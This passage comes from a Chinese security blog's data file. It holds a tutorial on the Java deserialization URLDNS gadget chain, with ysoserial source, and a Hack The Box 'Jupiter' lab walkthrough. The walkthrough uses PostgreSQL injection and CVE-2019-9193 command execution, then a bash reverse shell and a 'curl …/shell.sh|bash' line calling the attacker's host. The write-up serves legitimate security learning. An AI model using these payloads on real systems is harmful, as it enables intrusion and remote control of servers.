class=\"string\">&quot;age：&quot;</span> + deserializedUser.getAge());</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">            ex.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671516-1.png\" alt=\"img\"></p>\n<p>这里我们重点关注readObject方法，因为readObject方法一旦被重写，反序列化该类时使用的便是重写后的readObject方法。如果该方法若是书写不当的话就有可能引发恶意代码的执行</p>\n<p>我们在上面反序列化例子的基础上重写User类中继承于Serializable接口的readObject类，加上经典的计算器弹窗代码</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-2.png\" alt=\"img\"></p>\n<p>然后再次运行代码，可以看到成功弹窗了</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-3.png\" alt=\"img\"></p>\n<p>然而实际情况中，经过多次测试的项目代码很少会出现这么简单直接的安全问题。大部分的漏洞点还是出现在代码的逻辑问题上，也就是我们常说的：每一段代码单独拿出来看其实是没有什么问题的，但是将他们组合到一起可能就会产生逻辑漏洞。安全人员利用在反序列化的过程中被重写的一些方法和可控属性，最终找到能够执行恶意代码或者命令的攻击方式，我们通常称之为漏洞利用链。</p>\n<h1 id=\"0x03工具\"><a href=\"#0x03工具\" class=\"headerlink\" title=\"0x03工具\"></a>0x03工具</h1><p>工欲善其事必先利其器，善于利用优秀的工具并不是一个人懒惰的表现，而是会使我们在漏洞分析利用的过程中如虎添翼</p>\n<h3 id=\"3-1-ysoserial\"><a href=\"#3-1-ysoserial\" class=\"headerlink\" title=\"3.1 ysoserial\"></a>3.1 ysoserial</h3><ul>\n<li>作者：Chris Frohoff</li>\n<li>Github链接：<a href=\"https://github.com/frohoff/ysoserial\">https://github.com/frohoff/ysoserial</a></li>\n<li>简介：该工具是作者在提出CC链的时候放出的，它可以非常方便快捷地生成各种常见的 Java 序列化 payload，用于测试和利用反序列化漏洞</li>\n<li>用例：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar ysoserial-all.jar URLDNS &quot;http://hgkj4n.dnslog.cn&quot; &gt; payload.ser</span><br></pre></td></tr></table></figure>\n\n<p>通过分析工具的源码我们往往能从中get到作者对于漏洞的独特理解</p>\n<h1 id=\"0x04-入门链\"><a href=\"#0x04-入门链\" class=\"headerlink\" title=\"0x04 入门链\"></a>0x04 入门链</h1><h3 id=\"4-1-URLDNS链\"><a href=\"#4-1-URLDNS链\" class=\"headerlink\" title=\"4.1 URLDNS链\"></a>4.1 URLDNS链</h3><p>该链不具备攻击性质，只对指定的URL发送DNS查询，不做其他操作，并且对jdk版本没有限制，所以通常用来检测是否有反序列化漏洞</p>\n<p>先来看看ysoserial里生成payload的示例</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-4.png\" alt=\"img\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> ysoserial.payloads;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.InetAddress;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLStreamHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Reflections;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class=\"line\"><span class=\"comment\"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   This was inspired by  Philippe Arteau <span class=\"doctag\">@h</span>3xstream, who wrote a blog</span></span><br><span class=\"line\"><span class=\"comment\"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class=\"line\"><span class=\"comment\"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class=\"line\"><span class=\"comment\"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class=\"line\"><span class=\"comment\"> *   standard JDK classes.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class=\"line\"><span class=\"comment\"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class=\"line\"><span class=\"comment\"> *   during a comparison (either equals or hashCode).</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class=\"line\"><span class=\"comment\"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class=\"line\"><span class=\"comment\"> *   it to trigger a DNS lookup.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   Gadget Chain:</span></span><br><span class=\"line\"><span class=\"comment\"> *     HashMap.readObject()</span></span><br><span class=\"line\"><span class=\"comment\"> *       HashMap.putVal()</span></span><br><span class=\"line\"><span class=\"comment\"> *         HashMap.hash()</span></span><br><span class=\"line\"><span class=\"comment\"> *           URL.hashCode()</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@Dependencies()</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">URLDNS</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> Object <span class=\"title function_\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String url)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//Avoid DNS resolution during payload creation</span></span><br><span class=\"line\">                <span class=\"comment\">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class=\"line\">                <span class=\"type\">URLStreamHandler</span> <span class=\"variable\">handler</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SilentURLStreamHandler</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"type\">HashMap</span> <span class=\"variable\">ht</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>(); <span class=\"comment\">// HashMap that will contain the URL</span></span><br><span class=\"line\">                <span class=\"type\">URL</span> <span class=\"variable\">u</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">URL</span>(<span class=\"literal\">null</span>, url, handler); <span class=\"comment\">// URL to use as the Key</span></span><br><span class=\"line\">                ht.put(u, url); <span class=\"comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                Reflections.setFieldValue(u, <span class=\"string\">&quot;hashCode&quot;</span>, -<span class=\"number\">1</span>); <span class=\"comment\">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">return</span> ht;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">                PayloadRunner.run(URLDNS.class, args);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class=\"line\"><span class=\"comment\">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class=\"line\"><span class=\"comment\">         * using the serialized object.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class=\"line\"><span class=\"comment\">         * second resolution.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SilentURLStreamHandler</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">URLStreamHandler</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">protected</span> URLConnection <span class=\"title function_\">openConnection</span><span class=\"params\">(URL u)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">protected</span> <span class=\"keyword\">synchronized</span> InetAddress <span class=\"title function_\">getHostAddress</span><span class=\"params\">(URL u)</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>作者在示例的注释中也给出了链条的调用</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-5.png\" alt=\"img\"></p>\n<p>我们直接根据链条正序分析</p>\n<p>反序列化的触发点在HashMap类，我们跟进看一下</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-6.png\" alt=\"img\"></p>\n<p>可以看到，继承了Serializable接口，满足序列化的条件</p>\n<p>继续跟进该类的readObject方法</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-7.png\" alt=\"img\"></p>\n<p>方法的最后读取了反序列化之后的键和值，并使用 putVal 方法将键值对放入 HashMap 中，而这个过程中又调用了该类的hash方法</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-8.png\" alt=\"img\"></p>\n<p>继续跟进hash方法，发现其调用了key对象的hashCode方法</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-9.png\" alt=\"img\"></p>\n<p>而key则是URL类的实例化对象</p>\n<p>跟进该类的hashCode方法，发现其调用了另一个对象的hashCode方法</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-10.png\" alt=\"img\"></p>\n<p>这里需要注意的是，我们需要绕过一个if判断条件</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-11.png\" alt=\"img\"></p>\n<p>可以看到hashCode变量初始值为-1，而在我们序列化的时候就会执行一遍hashCode函数，返回hashCode值就从-1变成了URL的字符串，等到我们反序列化的时候，就无法绕过if语句，所以这里我们需要将hashCode值进行控制修改，就利用到了前面提到的反射的知识，我们可以回过头看一下ysoserial生成payload的代码</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671517-12.png\" alt=\"img\"></p>\n<p>这里就不过多解释了，我们接着上面的继续分析</p>\n<p>跟进handler对象，发现它是通过URLStreamHandler类修饰的</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671518-13.png\" alt=\"img\"></p>\n<p>所以我们进去该类看一下它的hashCode方法</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671518-14.png\" alt=\"img\"></p>\n<p>跟进getHostAddress方法，发现其调用了InetAddress对象的getByName方法</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671518-15.png\" alt=\"img\"></p>\n<p>该方法可以根据传入的主机名查询IP，触发一次dns查询，至此链条结束</p>\n<p>所以更详细的利用链应该是：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">HashMap.readObject()</span><br><span class=\"line\">    HashMap.putVal()</span><br><span class=\"line\">        HashMap.hash()</span><br><span class=\"line\">            URL.hashCode()</span><br><span class=\"line\">                URLStreamHandler.hashCode()</span><br><span class=\"line\">                    InetAddress.getByName()</span><br></pre></td></tr></table></figure>\n\n<p>通过ysoserial工具我们可以很方便的生成payload</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671518-16.png\" alt=\"img\"></p>\n<p>然后编写一个简单的反序列化漏洞demo来验证利用链</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">URLDNSTest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">FileInputStream</span> <span class=\"variable\">fis</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;1.ser&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">oit</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(fis);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">u</span> <span class=\"operator\">=</span> oit.readObject();</span><br><span class=\"line\">        System.out.println(u);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>不知道为什么本地打不通，猜测是dns服务器的问题，我上vps打</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671518-17.png\" alt=\"img\"></p>\n<p>成功在ceye上收到dns请求</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E4%BB%8E0%E5%88%B01/1699218671518-18.png\" alt=\"img\"></p>\n<p>最后我们再回过头来看一下ysoserial中payload的生成过程：</p>\n<p>先是通过payload加载类将我们指定的url传入URLDNS的getObject方法，方法中创建了一个HashMap对象ht，和URL对象u（处理url），通过put方法将URL对象u和传入的url分别作为键和值存储与HashMap对象ht中（URL对象做为键正是触发DNS解析的关键），再利用反射将序列化后被修改的hashCode值重置为-1（原因上面有说），最后返回HashMap对象ht，并在payload加载类中将其序列化。最后我们的Demo将其反序列化时调用了重写后的readObject方法进而启动整个链条达到最终的DNS解析</p>\n<h1 id=\"0x05-总结\"><a href=\"#0x05-总结\" class=\"headerlink\" title=\"0x05 总结\"></a>0x05 总结</h1><p>一顿分析下来感觉对反序列化的理解清晰了不少，但是还是感觉java漏洞挺难的，反正学习过程中一定要边看教程边动手实操分析，这样才能快速发现并解决问题。URLDNS之后还有CC链、CB链等，长路漫漫，仍需努力！</p>\n","categories":["WEB安全"],"tags":["Java反序列化"]},{"title":"一个靶场（HTB-Jupiter）带你了解红队打点思路","url":"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<h1 id=\"外网信息收集\"><a href=\"#外网信息收集\" class=\"headerlink\" title=\"外网信息收集\"></a>外网信息收集</h1><h3 id=\"端口扫描（nmap）\"><a href=\"#端口扫描（nmap）\" class=\"headerlink\" title=\"端口扫描（nmap）\"></a>端口扫描（nmap）</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -A 10.10.11.216</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418381-147.png\" alt=\"img\"></p>\n<p>开放了80和22端口，22端口的SSH服务在不知道账户密码的情况下还是比较难利用的，所以我们先重点关注80端口的web服务（需将跳转的域名添加到host文件）</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-148.png\" alt=\"img\"></p>\n<h3 id=\"子域名爆破（gobuster）\"><a href=\"#子域名爆破（gobuster）\" class=\"headerlink\" title=\"子域名爆破（gobuster）\"></a>子域名爆破（gobuster）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gobuster vhost -u http://jupiter.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-149.png\" alt=\"img\"></p>\n<p>发现了一个存活子域kiosk.jupiter.htb，先添加到host文件</p>\n<h3 id=\"指纹识别（whatweb）\"><a href=\"#指纹识别（whatweb）\" class=\"headerlink\" title=\"指纹识别（whatweb）\"></a>指纹识别（whatweb）</h3><p>我们对现有的资产做一个指纹识别</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://jupiter.htb</span><br><span class=\"line\">http://kiosk.jupiter.htb</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-150.png\" alt=\"img\"></p>\n<p>（信息收集这里我只演示了比较基础的三个操作，其实大家都知道渗透测试的关键在于信息收集，所以这一块在时间允许的范围内肯定是做的越多越好，而且在涉及到需要爆破的操作时，字典当然也是越大越好）</p>\n<h1 id=\"Web打点\"><a href=\"#Web打点\" class=\"headerlink\" title=\"Web打点\"></a>Web打点</h1><p>对于整理出来的资产信息，红队人员一般都会选择薄弱的资产入手，而薄弱资产一般指的是网站使用了一些存在历史漏洞的通用应用组件、CMS、OA系统等，也就是我们常说的1day、nday。（这里抛开0day这种核武器不谈）</p>\n<h3 id=\"Grafana\"><a href=\"#Grafana\" class=\"headerlink\" title=\"Grafana\"></a>Grafana</h3><p>回到我们的目标，通过指纹识别我们可以看到主站都是一些很常见的指纹，暂时没有发现可以进一步利用的地方，而在子域kiosk.jupiter.htb我们发现了一个特殊的指纹Grafana，版本是9.5.2</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-151.png\" alt=\"img\"></p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-152.png\" alt=\"img\"></p>\n<p>先问一手gpt，了解一下这个应用服务</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-153.png\" alt=\"img\"></p>\n<p>然后根据版本去找它的历史漏洞，由于靶场的目的是获取权限，所以我们需要重点关注一些信息泄露（找到账号密码直接ssh登录）、sql注入（也是为了rce或者拿到账户密码）或者是直接RCE的洞</p>\n<p>所以确定了范围之后找到了一个sql注入的文章<a href=\"https://community.grafana.com/t/sql-injection-in-api-tsdb-query-in-grafana/29713\">https://community.grafana.com/t/sql-injection-in-api-tsdb-query-in-grafana/29713</a></p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-154.png\" alt=\"img\"></p>\n<p>入口是一个查询数据库的接口，我们通过burp对目标抓包，也可以看到一样的接口</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-155.png\" alt=\"img\"></p>\n<p>通过观察请求体内容我们可以看到使用的是PostgresSQL数据库</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-156.png\" alt=\"img\"></p>\n<h3 id=\"PostgresSQL注入到RCE\"><a href=\"#PostgresSQL注入到RCE\" class=\"headerlink\" title=\"PostgresSQL注入到RCE\"></a>PostgresSQL注入到RCE</h3><p>所以我们直接去搜索该数据库的注入方式，找到了一篇比较详细的文章<a href=\"https://www.freebuf.com/articles/web/249371.html\">https://www.freebuf.com/articles/web/249371.html</a></p>\n<p>我们先来验证一下</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-157.png\" alt=\"img\"></p>\n<p>可以看到，成功查询到了版本号</p>\n<p>而有趣的是，我在查找的过程中发现了PostgresSQL数据库存在一个可以直接RCE的历史漏洞**[CVE-2019–9193]**，要是可以成功利用那我们就可以省去在数据库翻找的时间了，我们根据网上找到的文章进行复现<a href=\"https://cloud.tencent.com/developer/article/1472565\">https://cloud.tencent.com/developer/article/1472565</a></p>\n<p>先依次执行以下四个语句（最终会执行”id“系统命令并返回结果）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">DROP TABLE IF EXISTS cmd_exec;1</span><br><span class=\"line\">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class=\"line\">COPY cmd_exec FROM PROGRAM <span class=\"string\">&#x27;id&#x27;</span>;</span><br><span class=\"line\">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-158.png\" alt=\"img\"></p>\n<p>可以看到，执行完最后一条指令后，成功返回执行结果</p>\n<p>那么接下来就好办了，我们将”id“改为反弹shell的命令”&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.50&#x2F;4444 0&gt;&amp;1“，就可以拿到用户系统的shell了</p>\n<p>重新执行一遍语句，在写入命令的时候，报错了</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-159.png\" alt=\"img\"></p>\n<p>可能是特殊字符的问题，所以我们在本地写一个sh脚本，然后让目标通过curl下载执行就可以了</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-160.png\" alt=\"img\"></p>\n<p>起一个http服务</p>\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-161.png\" alt=\"img\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">替换为以下命令：</span><br><span class=\"line\">curl http://10.10.14.50:5555/shell.sh|bash</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/%E4%B8%80%E4%B8%AA%E9%9D%B6%E5%9C%BA%EF%BC%88HTB-Jupiter%EF%BC%89%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E6%80%9D%E8%B7%AF/1699216418382-162.png\" 